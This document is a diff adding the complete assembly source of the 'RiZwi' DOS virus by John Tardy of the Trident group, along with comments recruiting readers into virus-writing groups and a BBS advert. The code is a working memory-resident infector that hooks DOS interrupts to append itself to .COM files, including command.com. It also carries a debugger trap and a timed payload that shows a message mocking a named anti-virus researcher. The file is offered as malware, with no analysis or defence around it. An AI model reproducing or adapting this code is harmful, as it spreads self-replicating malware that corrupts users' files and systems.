@@ -1,0 +1,256 @@
+;
+; RiZwi Virus by John Tardy / Trident    V1.1
+;
+; This is a tom-resident .com infector, including command.com. it attaches
+; itself at the eof. when the generation counter is between 200 and 240, a
+; timer counter will be started. when it reached 5000 hex ticks, it will
+; display a message with black chars and a red background in the upper corner.
+; The message says an important fact of Righard Zwienenberg, who is known in
+; The Netherlands as a anti-virus researcher. In fact, he did release a virus,
+; named "DUTCH-555". I know he did it accidentally, but you should do it. You
+; have to be on just one side, virus or antivirus. If you can't choose, then
+; stop with computing. If you choose, I hope you choose our side. It has more
+; possibilities and with your capabilities your virii could be well-known
+; (look at the VSUM for your ratings). Maybe you even choose to be part of
+; [NUkE] or Phalcon/Skism or even Trident.
+;
+; This is a bug-fix of V1.0, which kept the original interupt in the main
+; program, thus simply hanging. This one has also a little debugger trap.
+
+                Org 100h
+
+Prg:            Call On1
+On1:            Pop Bp
+                Sub Bp,On1
+                Mov Ah,30h
+                Int 21h
+                Cmp Bx,'BC'
+                Je  Tooz
+
+                Mov Ah,2ah
+                Int 21h
+                In Al,21h
+                Cmp Cx,1993
+                Ja MakeRes
+                Cmp Dh,4
+                Ja MakeRes
+Tooz:           Jmp DoCom
+
+MakeRes:        Or Al,02h
+                Push Ax
+                Mov Ax,351ch
+                Int 21h
+                Mov Word Ptr Cs:Old1c[0][Bp],Bx
+                Mov Word Ptr Cs:Old1c[2][Bp],es
+                Pop Ax
+                Out 21h,Al
+CutIt:          Mov Ax,3521h
+                Int 21h
+                Mov Word Ptr Cs:Old21[0][Bp],Bx
+                Mov Word Ptr Cs:Old21[2][Bp],Es
+                In Al,21h
+                And Al,2
+                Push Ax
+                Mov Ax,Cs
+                Dec Ax
+                Mov Ds,Ax
+                Cmp Byte Ptr Ds:[0],'Z'
+                Jne DoCom
+                Sub Word Ptr Ds:[3],PrgPar
+                Sub Word Ptr Ds:[12h],PrgPar
+                Lea Si,Prg[Bp]
+                Mov Di,100h
+                Pop Ax
+                Cmp Al,2
+                Jne CutIt
+                Mov Ax,Word Ptr Ds:[12h]
+                Sub Ax,10h
+                Mov Es,Ax
+                Mov Cx,PrgLen
+                Push Cs
+                Pop Ds
+                Rep Movsb
+                In Al,21h
+                Xor Al,2
+                Mov Ds,Es
+                Out 21h,Al
+                Mov Ax,251ch
+                Lea Dx,New1c
+                Int 21h
+                Mov Ax,2521h
+                Lea Dx,New21
+                Int 21h
+DoCom:          Push Cs
+                Pop Ds
+                Mov Es,Ds
+                Mov Di,100h
+                Push Di
+                Lea Si,OrgPrg[Bp]
+                Movsw
+                Movsb
+                Ret
+
+OrgPrg          DB 0CDh,020h
+                DB ''
+
+                Db '[TridenT]'
+
+Dos:            Pushf
+                Call Dword Ptr Cs:[Old21]
+                Ret
+
+                Db '{V1.1 Bugfix}'
+
+Old21           DD 0
+New21:          Cmp Ax,4b00h
+                Je Exec
+                Cmp Ah,30h
+                Jne EOI
+                Call Dos
+                Mov Bx,'BC'
+                Iret
+
+EOI:            Jmp Dword Ptr Cs:[Old21]
+
+Exec:           Push Ax
+                Push Bx
+                Push Cx
+                Push Dx
+                Push Si
+                Push Di
+                Push Ds
+                Push Es
+                Push Bp
+                Push Ds
+                Push Dx
+                Mov Ax,4300h
+                Call Dos
+                Mov FAttr,Cx
+                Xor Cx,Cx
+                Mov Ax,4301h
+                Call Dos
+                Mov Ax,3d02h
+                Call Dos
+                Mov FHandle,Ax
+                Xchg Ax,Bx
+                Mov Ax,5700h
+                Call Dos
+                Mov Word Ptr Cs:[FTime],Cx
+                Mov Word Ptr Cs:[FDate],Dx
+                And Cx,1fh
+                Cmp Cx,1fh
+                Jne  DoMore
+Close:          Mov Ah,3eh
+                Call Dos
+                Pop Dx
+                Pop Ds
+                Mov Cx,FAttr
+                Mov Ax,4301h
+                Call Dos
+                Jmp ShutDown
+DoMore:         Mov Ah,3fh
+                Push Cs
+                Pop Ds
+                Lea Dx,OrgPrg
+                Mov Cx,3
+                Call Dos
+                Cmp Word Ptr Cs:[OrgPrg],'MZ'
+                Je Close
+                Cmp Word Ptr Cs:[OrgPrg],'ZM'
+                Je Close
+                Mov Ax,4202h
+                Xor Cx,Cx
+                Xor Dx,Dx
+                Call Dos
+                Sub Ax,3
+                Mov Jump,Ax
+                Mov Ah,40h
+                Lea Dx,Prg
+                Mov Cx,PrgLen
+                Call Dos
+                Mov Ax,4200h
+                Xor Cx,Cx
+                Xor Dx,Dx
+                Call Dos
+                Mov Ah,40h
+                Lea Dx,Start
+                Mov Cx,3
+                Call Dos
+                Mov Ax,5701h
+                Mov Cx,FTime
+                Mov Dx,FDate
+                Or Cx,1fh
+                Call Dos
+                Inc Byte Ptr Cs:[FileCount]
+                Jmp Close
+
+ShutDown:       Pop Bp
+                Pop Es
+                Pop Ds
+                Pop Di
+                Pop Si
+                Pop Dx
+                Pop Cx
+                Pop Bx
+                Pop Ax
+                Jmp EOI
+
+Old1c           DD 0
+
+New1c:          pushf
+                push ax
+                push cx
+                push si
+                push di
+                push ds
+                push es
+                Cmp Byte Ptr Cs:[FileCount],200
+                Jb EOI16
+                Cmp Byte Ptr Cs:[FileCount],240
+                Ja EOI16
+
+                Cmp Word Ptr Cs:[ActCount],5000h
+                Je Activate
+                Inc Word Ptr Cs:[ActCount]
+                Jmp EOI16
+
+Activate:       
+                Mov Ds,Cs
+                Mov Ax,0b800h
+
+                Mov Es,Ax
+                Lea Si,ScrMsg
+                Mov Di,160
+                Sub Di,ScrLen
+
+                Mov Cx,ScrLen
+                Rep MovSb
+
+EOI16:          pop es
+                pop ds
+                pop di
+                pop si
+                pop cx
+                pop ax
+                popf
+                iret
+
+ScrMsg          Db ' OROiOgOhOaOrOdO OZOwOiOeOnOeOnObOeOrOgO OmOaOdOeO OtOhOeO ODOUOTOCOHO-O5O5O5O OVOiOrOuOsO!O!O!O O'
+ScrLen          Equ $-ScrMsg
+
+FileCount       Db 0
+ActCount        Dw 0
+Start           Db 0e9h
+Jump            Dw 0
+FAttr           Dw 0
+FHandle         Dw 0
+FDate           Dw 0
+FTime           Dw 0
+
+PrgLen          Equ $-Prg
+PrgPar          Equ (PrgLen+0fh)/16
+
+;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
+;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
